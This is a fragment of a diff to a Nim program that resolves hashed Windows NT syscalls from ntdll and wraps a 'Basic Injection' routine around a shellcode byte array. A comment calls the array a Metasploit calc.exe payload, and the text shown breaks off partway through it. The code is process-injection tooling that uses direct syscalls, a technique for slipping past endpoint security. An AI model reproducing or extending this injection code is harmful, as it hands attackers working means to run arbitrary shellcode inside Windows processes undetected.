@@ -55,7 +55,9 @@ const
 # Resolve syscalls
 
 let 
-    Ntdll = ? NTDLL_BASE()
+    Ntdll = NTDLL_BASE().valueOr():
+        echo "Failed to find NTDLL"
+        quit()
 
     NtCloseSyscall                 = ctGetNtSyscall[NtClose](Ntdll, ModuleHandle(NULL), NtCloseHash, symEnum, ssnEnum, exeEnum)
     NtOpenProcessSyscall           = ctGetNtSyscall[NtOpenProcess](Ntdll, ModuleHandle(NULL), NtOpenProcessHash, symEnum, ssnEnum, exeEnum)
@@ -66,7 +68,7 @@ let
 # ----------------------------------------------------------------------------
 # Basic Injection
 
-when isMainModule:
+proc inject(): NtResult =
     # I think this is a msf calc.exe payload :-)
     var buf: array[276, byte] = [
         byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
